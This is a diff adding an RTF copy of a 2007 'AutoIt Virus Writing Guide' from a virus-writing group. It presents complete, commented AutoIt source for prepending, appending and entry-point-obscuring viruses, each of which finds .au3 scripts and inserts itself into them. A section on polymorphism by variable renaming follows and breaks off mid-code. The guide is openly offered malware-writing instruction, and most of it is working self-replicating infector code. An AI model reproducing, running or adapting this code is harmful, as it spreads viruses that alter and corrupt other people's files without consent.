@@ -1,0 +1,410 @@
+{\rtf1\ansi\ansicpg1252\deff0{\fonttbl{\f0\fnil Courier New;}{\f1\fnil\fcharset0 Courier New;}}
+{\colortbl ;\red0\green0\blue0;\red255\green0\blue0;\red172\green0\blue169;\red0\green153\blue51;\red170\green0\blue0;\red255\green51\blue255;\red153\green153\blue204;\red0\green0\blue144;\red0\green0\blue255;\red240\green0\blue255;\red111\green111\blue179;}
+{\*\generator Msftedit 5.41.15.1507;}\viewkind4\uc1\pard\qc\cf1\lang1033\b\f0\fs20 AutoIt Virus Writing Guide\b0\par
+\b Genetix\cf2 [\cf1 DoomRiderz\cf2 ]\cf1\b0\par
+\b JAN\cf2 -\cf1 2007\b0\par
+\pard\par
+\par
+\par
+Introduction:\par
+\par
+    \cf2\b *\cf1\b0  About AutoIt\par
+\par
+Infections:\par
+\par
+    \cf2\b *\cf1\b0  Prepender\par
+    \cf2\b *\cf1\b0  Appender\par
+    \cf2\b *\cf1\b0  EPO\par
+\par
+\par
+Polymorphism:\par
+\par
+    \cf2\b *\cf1\b0  Variable changing\par
+    \cf2\b *\cf1\b0  Randomized \cf0 String\cf1  Encryption\par
+    \cf2\b *\cf1\b0  Adding trash\par
+    \cf2\b *\cf1\b0  Breaking lines \cf2\b (\cf1\b0 Possibly New method\cf2\b )\cf1\b0\par
+\par
+\lang2057\f1 Outroduction\lang1033\f0 :\par
+\par
+    \cf2\b *\cf1\b0  \lang2057\f1 Credits!....\par
+\lang1033\f0\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\cf2\b ++++++++++\cf1\b0 About AutoIt\cf2\b ++++++++++++++--------------------------------------------------------------------------------------\cf1\b0\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\par
+AutoIt v3 is a freeware BASIC\cf2\b -\cf1\b0 like scripting language designed \cf0 for\cf1  automating the Windows GUI \cf0 and\cf1  general scripting\cf2\b .\cf1\b0  \par
+It uses a combination of simulated keystrokes\cf2\b ,\cf1\b0  mouse movement \cf0 and\cf1  window\cf2\b /\cf1\b0 control manipulation in order to automate \par
+tasks \cf0 in\cf1  a way \cf0 not\cf1  possible \cf0 or\cf1  reliable \cf0 with\cf1  other languages \cf2\b (\cf1\b0 e.\i g\i0 . VBScript and SendKeys\cf2\b ).\cf1\b0  AutoIt is also very small\cf2\b ,\cf1\b0  \par
+\par
+self\cf2\b -\cf1\b0 contained and will \cf0 run\cf1  on \cf3\b\i 95\cf2\i0 ,\cf1\b0  \cf3\b\i 98\cf2\i0 ,\cf1\b0  ME\cf2\b ,\cf1\b0  NT4\cf2\b ,\cf1\b0  \cf3\b\i 2000\cf2\i0 ,\cf1\b0  XP \cf2\b &\cf1\b0  \cf3\b\i 2003\cf1\b0\i0  out of the box with no annoying "runtimes" required! \par
+You can even make compiled executable scripts that can run without AutoIt being installed!\par
+\par
+AutoIt was initially designed for PC \cf0 'roll out'\cf1  situations to reliably configure thousands of PCs\cf2\b ,\cf1\b0  but with the arrival \par
+of v3 it has become a powerful language able to cope with most scripting needs\cf2\b .\cf1\b0\par
+\par
+this is from the AutoIt website\cf0\b ..\b0\i I\i0 'm lazy! see http://www.hiddensoft.com/autoit3/\par
+\par
+So anyway my opinion it\b '\b0 s\b  \b0 just ANOTHER script language and nobody serious about virus writing cares about these things\b\par
+\b0 but for me it\b '\b0 s\b  \b0 all about fun and enjoying youself so just do w/e you enjoy.. I enjoyed this so maybe someone else will\b  \par
+\b0 too\b .\b0\par
+\cf1\par
+\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\cf2\b +++++++++++++\cf1\b0 Prepender\cf2\b ++++++++++++++--------------------------------------------------------------------------------------\cf1\b0\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\par
+\cf4\i ;Genetix[DoomRiderz]\par
+\cf1\i0\par
+\cf5\b $self\cf2 =\cf6 @ScriptName\cf1\b0                                                                  \cf4\i ;get self name\par
+\cf5\b\i0 $line\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $virus\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $readhost\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $me\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $self\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0                                                           \cf4\i ;open self\par
+\cf9\b\i0 while\cf1\b0  \cf3\b\i 1\cf1\b0\i0\par
+    \cf5\b $line\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileReadLine\cf2\i0 (\cf5 $me\cf2 )\cf1\b0  \lang2057\f1                                                     \cf4\lang1033\i\f0 ;read line\par
+\cf1\i0     \cf9\b If\cf1\b0  \cf6\b @error\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0  \cf9\b ExitLoop\cf1\b0  \lang2057\f1                                                  \cf4\lang1033\i\f0 ;exit EOF\par
+\cf1\i0         \cf9\b if\cf1\b0  \cf2\b (\cf5 $line\cf1\b0  \cf2\b =\cf1\b0  \cf7\b ";endvirus"\cf2 )\cf1\b0  \cf9\b then\cf1\b0   \par
+       \cf9\b ExitLoop\cf1\b0                                                                    \cf4\i ;exit at end of the virus code\par
+\cf1\i0     \cf9\b EndIf\cf1\b0  \par
+    \cf5\b $virus\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $virus\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $line\cf1\b0                                                \cf4\i ;build virus body\par
+\cf9\b\i0 Wend\cf1\b0\par
+\cf8\b\i FileClose\cf2\i0 (\cf5 $me\cf2 )\cf1\b0\par
+\par
+\cf5\b $search\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileFindFirstFile\cf2\i0 (\cf7 "*.au3"\cf2 )\cf1\b0                                               \cf4\i ;find AutoIt files\par
+\cf9\b\i0 If\cf1\b0  \cf5\b $search\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0\par
+    \cf9\b Exit\cf1\b0                                                                           \cf4\i ;exit no files\par
+\cf9\b\i0 EndIf\cf1\b0\par
+\par
+\cf9\b While\cf1\b0  \cf3\b\i 1\cf1\b0\i0\par
+    \cf5\b $file\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileFindNextFile\cf2\i0 (\cf5 $search\cf2 )\cf1\b0\par
+    \cf9\b if\cf1\b0  \cf2\b (\cf5 $file\cf1\b0  \cf2\b ==\cf1\b0  \cf7\b ""\cf2 )\cf1\b0  \cf9\b then\cf1\b0  \cf9\b ExitLoop\cf1\b0                                                 \cf4\i ;same exit if no files\par
+\cf1\i0         \cf5\b $host\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $file\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0                                \par
+        \cf9\b If\cf1\b0  \cf5\b $host\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b then\cf1\b0  \cf9\b ExitLoop\cf1\b0  \lang2057\f1                                               \cf4\lang1033\i\f0 ;exit EOF\par
+\cf1\i0             \cf5\b $readhost\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileRead\cf2\i0 (\cf5 $host\cf2 ,\cf1\b0  \cf8\b\i FileGetSize\cf2\i0 (\cf5 $file\cf2 ))\cf1\b0                        \cf4\i ;read entire file into variable\par
+\cf1\i0        \cf8\b\i FileClose\cf2\i0 (\cf5 $host\cf2 )\cf1\b0\par
+       \cf9\b if\cf1\b0  \cf8\b\i StringInStr\cf2\i0 (\cf5 $readhost\cf2 ,\cf1\b0  \cf7\b ";Genetix[DoomRiderz]"\cf2 )\cf1\b0  \cf2\b <>\cf1\b0  \cf9\b True\cf1\b0  \cf9\b Then\cf1\b0              \cf4\i ;make sure its not already infected\par
+\cf1\i0            \cf5\b $InsertVirus\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $file\cf2 ,\cf3\i 2\cf2\i0 )\cf1\b0\par
+        \cf8\b\i FileWriteline\cf2\i0 (\cf5 $InsertVirus\cf2 ,\cf1\b0  \cf2\b _\cf1\b0\par
+            \cf5\b $virus\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf7\b ";endvirus"\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $readhost\cf2 )\cf1\b0                        \cf4\i ;write virus befor\lang2057\f1 e\lang1033\f0  victims code (prepend)\par
+\cf1\i0         \cf8\b\i FileClose\cf2\i0 (\cf5 $InsertVirus\cf2 )\cf1\b0\par
+       \cf9\b EndIf\cf1\b0\par
+\cf9\b Wend\cf1\b0                                                                               \cf4\i ;continue searching\par
+\cf1\i0        \par
+\cf4\i ;endvirus\par
+\cf1\i0\par
+\par
+\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\cf2\b +++++++++++++\cf1\b0 Appender\cf2\b +++++++++++++++--------------------------------------------------------------------------------------\cf1\b0\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\par
+\cf4\i ;start\par
+;Genetix[DoomRiderz]\par
+\cf1\i0\par
+\cf5\b $self\cf2 =\cf6 @ScriptName\cf1\b0                                                                  \cf4\i ;get script name\par
+\cf5\b\i0 $line\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $virus\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $readhost\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $me\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $self\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0                                                           \cf4\i ;open self\par
+\cf9\b\i0 while\cf1\b0  \cf3\b\i 1\cf1\b0\i0\par
+    \cf5\b $line\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileReadLine\cf2\i0 (\cf5 $me\cf2 )\cf1\b0                                                      \par
+    \cf9\b If\cf1\b0  \cf6\b @error\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0  \cf9\b ExitLoop\cf1\b0                                                   \cf4\i ;exit if EOF\par
+\cf1\i0         \cf9\b if\cf1\b0  \cf2\b (\cf5 $line\cf1\b0  \cf2\b =\cf1\b0  \cf7\b ";start"\cf2 )\cf1\b0  \cf9\b then\cf1\b0                                                 \cf4\i ;find beginning of virus code\par
+\cf1\i0             \cf9\b ExitLoop\cf1\b0                                                               \cf4\i ;exit loop when found               \par
+\cf1\i0     \cf9\b EndIf\cf1\b0\par
+\cf9\b Wend\cf1\b0\par
+\cf9\b while\cf1\b0  \cf3\b\i 1\cf1\b0\i0\par
+    \cf5\b $line\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileReadLine\cf2\i0 (\cf5 $me\cf2 )\cf1\b0                                                      \cf4\i ;read 1 line per loop\par
+\cf1\i0     \cf9\b If\cf1\b0  \cf6\b @error\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0  \cf9\b ExitLoop\cf1\b0                                                   \cf4\i ;exit EOF\par
+\cf1\i0     \cf9\b if\cf1\b0  \cf2\b (\cf5 $line\cf1\b0  \cf2\b =\cf1\b0  \cf7\b ";endvirus"\cf2 )\cf1\b0  \cf9\b then\cf1\b0\par
+    \cf9\b ExitLoop\cf1\b0                                                                       \cf4\i ;Stop reading at end of virus\par
+\cf1\i0     \cf9\b EndIf\cf1\b0\par
+    \cf5\b $virus\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $virus\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $line\cf1\b0                                                \cf4\i ;build the virus\par
+\cf9\b\i0 Wend\cf1\b0    \par
+\cf8\b\i FileClose\cf2\i0 (\cf5 $me\cf2 )\cf1\b0\par
+\par
+\cf5\b $search\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileFindFirstFile\cf2\i0 (\cf7 "*.au3"\cf2 )\cf1\b0                                               \cf4\i ;search for AutoIt files\par
+\cf9\b\i0 If\cf1\b0  \cf5\b $search\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0\par
+    \cf9\b Exit\cf1\b0  \lang2057\f1                                                                          \cf4\lang1033\i\f0 ;exit if nothing is there\par
+\cf9\b\i0 EndIf\cf1\b0\par
+\cf9\b While\cf1\b0  \cf3\b\i 1\cf1\b0\i0\par
+    \cf5\b $file\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileFindNextFile\cf2\i0 (\cf5 $search\cf2 )\cf1\b0\par
+    \cf9\b if\cf1\b0  \cf2\b (\cf5 $file\cf1\b0  \cf2\b ==\cf1\b0  \cf7\b ""\cf2 )\cf1\b0  \cf9\b then\cf1\b0  \cf9\b ExitLoop\cf1\b0  \par
+    \cf5\b $host\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $file\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0                                                     \cf4\i ;open victim\par
+\cf1\i0     \cf9\b If\cf1\b0  \cf5\b $host\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b then\cf1\b0  \cf9\b ExitLoop\cf1\b0  \lang2057\f1                                                   \cf4\lang1033\i\f0 ;exit EOF\par
+\cf1\i0     \cf5\b $readhost\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileRead\cf2\i0 (\cf5 $host\cf2 ,\cf1\b0  \cf8\b\i FileGetSize\cf2\i0 (\cf5 $file\cf2 ))\cf1\b0                                \cf4\i ;read the entire host code\par
+\cf1\i0     \cf8\b\i FileClose\cf2\i0 (\cf5 $host\cf2 )\cf1\b0\par
+    \cf9\b if\cf1\b0  \cf8\b\i StringInStr\cf2\i0 (\cf5 $readhost\cf2 ,\cf1\b0  \cf7\b ";Genetix[DoomRiderz]"\cf2 )\cf1\b0  \cf2\b <>\cf1\b0  \cf9\b True\cf1\b0  \cf9\b Then\cf1\b0                 \cf4\i ;make sure it isnt infected already\par
+\cf1\i0         \cf5\b $InsertVirus\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $file\cf2 ,\cf3\i 2\cf2\i0 )\cf1\b0\par
+    \cf8\b\i FileWriteline\cf2\i0 (\cf5 $InsertVirus\cf2 ,\cf1\b0  \cf2\b _\cf1\b0\par
+    \cf5\b $readhost\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf7\b ";start"\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $virus\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf7\b ";endvirus"\cf2 )\cf1\b0           \cf4\i ;append the virus\par
+\cf1\i0     \cf8\b\i FileClose\cf2\i0 (\cf5 $InsertVirus\cf2 )\cf1\b0\par
+    \cf9\b EndIf\cf1\b0\par
+\cf9\b Wend\cf1\b0                                                                               \cf4\i ;continue searching\par
+\cf1\i0        \par
+\cf4\i ;endvirus\par
+\cf1\i0\par
+\par
+\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\cf2\b ++++++++++++++++\cf1\b0 EPO\cf2\b +++++++++++++++++--------------------------------------------------------------------------------------\cf1\b0\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\par
+\par
+\cf4\i ;start\par
+;Genetix[DoomRiderz]\par
+\cf5\b\i0 $self\cf2 =\cf6 @ScriptName\cf1\b0                                                                  \cf4\i ;get script name\par
+\cf1\i0                                                                                   \cf4\i ;setup some variables, this needs alot!\par
+\cf5\b\i0 $line\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $begin\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $virbody\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $virus\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $nextpart\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $readhost\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $complete\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $me\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $self\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0                                                           \cf4\i ;open itself\par
+\cf9\b\i0 while\cf1\b0  \cf3\b\i 1\cf1\b0\i0  \lang2057\f1                                                                           \cf4\lang1033\i\f0 ;loop until ExitLoop do us part\par
+\cf1\i0     \cf5\b $line\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileReadLine\cf2\i0 (\cf5 $me\cf2 )\cf1\b0                                                      \cf4\i ;read 1 line per loop\par
+\cf1\i0     \cf9\b If\cf1\b0  \cf6\b @error\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0  \cf9\b ExitLoop\cf1\b0  \lang2057\f1                                                  \cf4\lang1033\i\f0 ;exit EOF\par
+\cf1\i0         \cf9\b if\cf1\b0  \cf2\b (\cf5 $line\cf1\b0  \cf2\b =\cf1\b0  \cf7\b ";start"\cf2 )\cf1\b0  \cf9\b then\cf1\b0\par
+       \cf9\b ExitLoop\cf1\b0                                                                    \cf4\i ;stop, beginning of the virus is found\par
+\cf1\i0     \cf9\b EndIf\cf1\b0\par
+\cf9\b Wend\cf1\b0\par
+\cf9\b while\cf1\b0  \cf3\b\i 1\cf1\b0\i0\par
+    \cf5\b $line\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileReadLine\cf2\i0 (\cf5 $me\cf2 )\cf1\b0                                                      \cf4\i ;read 1 line perl loop\par
+\cf1\i0     \cf9\b If\cf1\b0  \cf6\b @error\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0  \cf9\b ExitLoop\cf1\b0  \lang2057\f1                                                  \cf4\lang1033\i\f0 ;yea..\par
+\cf1\i0     \cf9\b if\cf1\b0  \cf8\b\i StringMid\cf2\i0 (\cf5 $line\cf2 ,\cf1\b0  \cf3\b\i 1\cf2\i0 ,\cf1\b0  \cf3\b\i 9\cf2\i0 )\cf1\b0  \cf2\b =\cf1\b0  \cf7\b ";endvirus"\cf1\b0  \cf9\b Then\cf1\b0\par
+        \cf9\b ExitLoop\cf1\b0                                                                   \cf4\i ;stop, end of the virus is found\par
+\cf1\i0     \cf9\b EndIf\cf1\b0\par
+    \cf5\b $virbody\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $virbody\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $line\cf1\b0                                            \cf4\i ;build the virus body\par
+\cf9\b\i0 Wend\cf1\b0\par
+\cf8\b\i FileClose\cf2\i0 (\cf5 $me\cf2 )\cf1\b0  \lang2057\f1                                                                    \cf4\lang1033\i\f0 ;byez\par
+\cf5\b\i0 $virus\cf1\b0  \cf2\b =\cf1\b0  \cf7\b ";start"\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $virbody\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf7\b ";endvirus"\cf1\b0                         \cf4\i ;virus stored in $virus\par
+\cf1\i0\par
+\cf5\b $search\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileFindFirstFile\cf2\i0 (\cf7 "*.au3"\cf2 )\cf1\b0                                               \cf4\i ;find files\par
+\cf9\b\i0 If\cf1\b0  \cf5\b $search\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0\par
+    \cf9\b Exit\cf1\b0                                                                           \cf4\i ;exit if nothing is there\par
+\cf9\b\i0 EndIf\cf1\b0\par
+\par
+\cf9\b While\cf1\b0  \cf3\b\i 1\cf1\b0\i0\par
+    \cf5\b $file\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileFindNextFile\cf2\i0 (\cf5 $search\cf2 )\cf1\b0  \par
+    \cf9\b if\cf1\b0  \cf2\b (\cf5 $file\cf1\b0  \cf2\b ==\cf1\b0  \cf7\b ""\cf2 )\cf1\b0  \cf9\b then\cf1\b0  \cf9\b ExitLoop\cf1\b0                                                 \cf4\i ;again.. nvm\par
+\cf1\i0     \cf5\b $host\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $file\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0  \lang2057\f1                                                    \cf4\lang1033\i\f0 ;open any au3 file\par
+\cf1\i0     \cf9\b If\cf1\b0  \cf5\b $host\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b then\cf1\b0  \cf9\b ExitLoop\cf1\b0\par
+       \cf5\b $readhost\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileRead\cf2\i0 (\cf5 $host\cf2 ,\cf1\b0  \cf8\b\i FileGetSize\cf2\i0 (\cf5 $file\cf2 ))\cf1\b0                             \cf4\i ;read it entire host into $readhost\par
+\cf1\i0        \cf8\b\i FileClose\cf2\i0 (\cf5 $host\cf2 )\cf1\b0\par
+       \cf9\b if\cf1\b0  \cf8\b\i StringInStr\cf2\i0 (\cf5 $readhost\cf2 ,\cf1\b0  \cf7\b ";Genetix[DoomRiderz]"\cf2 )\cf1\b0  \cf2\b <>\cf1\b0  \cf9\b True\cf1\b0  \cf9\b Then\cf1\b0              \cf4\i ;check if its already infected\par
+\cf1\i0         \cf9\b if\cf1\b0  \cf8\b\i StringInStr\cf2\i0 (\cf5 $readhost\cf2 ,\cf1\b0  \cf7\b "EndFunc"\cf2 )\cf1\b0  \cf2\b <>\cf1\b0  \cf9\b False\cf1\b0  \cf9\b Then\cf1\b0                         \cf4\i ;can it use EPO on this file?\par
+\cf1\i0            \cf5\b $target\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $file\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0                                            \cf4\i ;open up the victim file again\par
+\cf1\i0            \cf9\b while\cf1\b0  \cf3\b\i 1\cf1\b0\i0                                                                 \cf4\i ;loopy\par
+\cf1\i0            \cf5\b $line\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileReadLine\cf2\i0 (\cf5 $target\cf2 )\cf1\b0                                           \cf4\i ;read 1 line per loop\par
+\cf1\i0            \cf9\b If\cf1\b0  \cf6\b @error\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0  \cf9\b ExitLoop\cf1\b0                                            \cf4\i ;exit EOF\par
+\cf1\i0             \cf9\b if\cf1\b0  \cf2\b (\cf5 $line\cf1\b0  \cf2\b =\cf1\b0  \cf7\b "EndFunc"\cf2 )\cf1\b0  \cf9\b then\cf1\b0                                            \cf4\i ;find a home for the virus\par
+\cf1\i0                \cf9\b ExitLoop\cf1\b0                                                            \cf4\i ;exit loop when thats found\par
+\cf1\i0             \cf9\b EndIf\cf1\b0\par
+           \cf5\b $begin\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $begin\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $line\cf1\b0                                         \cf4\i ;append lines from start to "EndFunc"\par
+\cf1\i0            \cf9\b Wend\cf1\b0\par
+           \cf9\b while\cf1\b0  \cf3\b\i 1\cf1\b0\i0\par
+           \cf5\b $line\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileReadLine\cf2\i0 (\cf5 $target\cf2 )\cf1\b0                                           \cf4\i ;read line's again\par
+\cf1\i0            \cf9\b If\cf1\b0  \cf6\b @error\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b Then\cf1\b0  \cf9\b ExitLoop\cf1\b0                                            \cf4\i ;exit EOF\par
+\cf1\i0                    \cf5\b $nextpart\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $nextpart\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $line\cf1\b0                           \cf4\i ;read from "EndFunc" to EOF\par
+\cf1\i0                     \cf9\b Wend\cf1\b0\par
+           \cf8\b\i FileClose\cf2\i0 (\cf5 $target\cf2 )\cf1\b0\par
+\par
+            \cf4\i ;here the virus gets 2 parts of the victim. First is everything until "EndFunk" 2nd is everything after it\par
+\cf1\i0             \cf4\i ;so it has these stored in 2 different variables.\par
+\cf1\i0             \cf4\i ;now we can insert the virus into the middle! hostpart1 + virus + hostpart2. easy!\par
+\cf1\i0\par
+           \cf5\b $complete\cf1\b0  \cf2\b =\cf1\b0  \cf5\b $begin\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $virus\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf7\b "EndFunc"\cf1\b0  \cf2\b &\cf1\b0  \cf6\b @CRLF\cf1\b0  \cf2\b &\cf1\b0  \cf5\b $nextpart\cf1\b0  \cf4\i ;join everything together\par
+\cf1\i0            \cf5\b $InsertVirus\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $file\cf2 ,\cf3\i 2\cf2\i0 )\cf1\b0                                        \cf4\i ;open the victim for writing\par
+\cf1\i0            \cf8\b\i FileWriteline\cf2\i0 (\cf5 $InsertVirus\cf2 ,\cf1\b0  \cf5\b $complete\cf2 )\cf1\b0                                  \cf4\i ;insert the virus\par
+\cf1\i0            \cf8\b\i FileClose\cf2\i0 (\cf5 $InsertVirus\cf2 )\cf1\b0\par
+           \cf9\b EndIf\cf1\b0\par
+            \cf9\b EndIf\cf1\b0\par
+\cf9\b Wend\cf1\b0                                                                               \cf4\i ;more searching!\par
+\cf1\i0        \par
+\cf4\i ;endvirus\par
+\cf1\i0\par
+\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\cf2\b +++++\cf1\b0 Variable name changing\cf2\b +++++++++--------------------------------------------------------------------------------------\cf1\b0\par
+\cf2\b ++++++++++++++++++++++++++++++++++++\cf1\b0\par
+\par
+\par
+\cf10\i #include\cf1\i0  \cf7\b <Array.au3>\cf1\b0                                                               \cf4\i ;include this to use arrays in AutoIt\par
+\cf1\i0\par
+\cf9\b Dim\cf1\b0  \cf5\b $avArray\cf1\b0  \lang2057\f1                                                                      \cf4\lang1033\i\f0 ;define array\par
+\cf5\b\i0 $avArray\cf1\b0  \cf2\b =\cf1\b0  \cf11\b\i _ArrayCreate\cf2\i0 (\cf7 "avArray"\cf2 ,\cf1\b0  \cf7\b "self"\cf2 ,\cf1\b0  \cf7\b "host"\cf2 ,\cf1\b0  \cf7\b "readhost"\cf2 ,\cf1\b0  \cf2\b _\cf1\b0\par
+          \cf7\b "rewrite"\cf2 ,\cf1\b0  \cf7\b "newvalues"\cf2 ,\cf1\b0  \cf7\b "var"\cf2 )\cf1\b0                                           \cf4\i ;setup variables to replace\par
+\cf1\i0\par
+\cf5\b $self\cf2 =\cf6 @ScriptName\cf1\b0                                                                  \cf4\i ;get the script name\par
+\cf5\b\i0 $readhost\cf2 =\cf7 ""\cf1\b0\par
+\cf5\b $host\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileOpen\cf2\i0 (\cf5 $self\cf2 ,\cf1\b0  \cf3\b\i 0\cf2\i0 )\cf1\b0  \lang2057\f1                                                        \cf4\lang1033\i\f0 ;open self\par
+\cf9\b\i0 If\cf1\b0  \cf5\b $host\cf1\b0  \cf2\b =\cf1\b0  \cf2\b -\cf3\i 1\cf1\b0\i0  \cf9\b then\cf1\b0  \cf9\b ExitLoop\cf1\b0  \cf4\lang2057\i\f1                                                       ;\lang1033\f0 exit \lang2057\f1 EOF\lang1033\f0\par
+\cf1\i0     \cf5\b $readhost\cf1\b0  \cf2\b =\cf1\b0  \cf8\b\i FileRead\cf2\i0 (\cf5 $host\cf2 ,\cf1\b0  \cf8\b\i FileGetSize\cf2\i0 (\cf5 $self\cf2 ))\cf1\b0                                \cf4\i ;read entir virus into variable\par
+\cf8\b FileClose\cf2\i0 (\cf5 $host\cf2 )\cf1\b0\par
+\par
+\cf5\b $newvalues\cf2 =\cf7 ""\cf1\b0\par
+\cf9\b FOR\cf1\b0  \cf5\b $i\cf2 =\cf3\i 0\cf1\b0\i0  \cf9\b to\cf1\b0  \cf8\b\i UBound\cf2\i0 (\cf5 $avArray\cf2 )\cf1\b0  \cf2\b -\cf1\b0  \cf3\b\i 1\cf1\b0\i0                                                   \cf4\i ;loop through each element in the array\par
+\cf1\i0     \cf5\b $var\cf2 =\cf7 ""\cf1\b0\par
